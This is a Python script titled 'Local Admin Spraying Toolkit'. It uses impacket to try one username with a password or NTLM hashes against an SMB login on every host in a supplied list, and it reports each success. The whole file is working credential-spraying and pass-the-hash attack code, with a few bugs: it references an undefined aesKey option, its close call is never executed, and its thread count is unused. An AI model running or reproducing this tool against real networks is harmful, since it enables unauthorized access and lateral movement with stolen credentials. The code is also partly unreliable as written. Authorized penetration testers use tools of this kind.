#!/usr/bin/python3
from __future__ import division
from __future__ import print_function
import sys
import argparse
import re
from impacket.smbconnection import SMBConnection
from impacket import smbconnection
import multiprocessing
import traceback


def login(username, password, domain, lmhash, nthash, aesKey, dc_ip, target_ip, port):
    try:
        smbClient = SMBConnection(target_ip, target_ip, sess_port=int(port))
        smbClient.login(username, password, domain, lmhash, nthash)
        print("Success %s %s" % (username, target_ip))
        SMBConnection.close
    except smbconnection.SessionError as e:
        return
    except Exception as e:
        print(e)
        return


def main():
    parser = argparse.ArgumentParser(add_help = True, description = "Local Admin Spraying Toolkit")

    group = parser.add_argument_group('authentication')
    group.add_argument('-computerlist', action='store', metavar = "userlist", help='List of computers to spray')
    group.add_argument('-username', action="store", metavar = "username", help='Username')
    group.add_argument('-password', action="store", metavar = "password", help='Clear-text password')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')

    group = parser.add_argument_group('connection')
    group.add_argument('-port', choices=['139', '445'], nargs='?', default='445', metavar="destination port",
                       help='Destination port to connect to SMB Server')

    group = parser.add_argument_group('threads')
    group.add_argument('-threads', action="store", metavar = "threads", help='Number of threads to use, default is 1')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    if options.password is None and options.hashes is None and options.aesKey is None:
        parser.print_help()
        sys.exit(1)

    if options.computerlist is None:
        parser.print_help()
        sys.exit(1)

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.password is None:
        password = ''
    else:
        password = options.password

    if options.threads is None:
        threads = 1
    else:
        threads = int(options.threads)

    domain = ''

    #threading
    jobs = []
    procs = int(threads) # Number of processes to create
    with open(options.computerlist, 'r') as computers:
        for computer in computers.readlines():
            process = multiprocessing.Process(target=login,
            args=(options.username, options.password, domain, lmhash, nthash, None, None, computer.strip(), options.port))
            jobs.append(process)

    # Start the processes (i.e. calculate the random number lists)      
    for j in jobs:
        j.start()

    # Ensure all of the processes have finished
    for j in jobs:
        j.join()

    print("Done spraying %s Computer" % len(jobs))

if __name__ == "__main__":
    main()
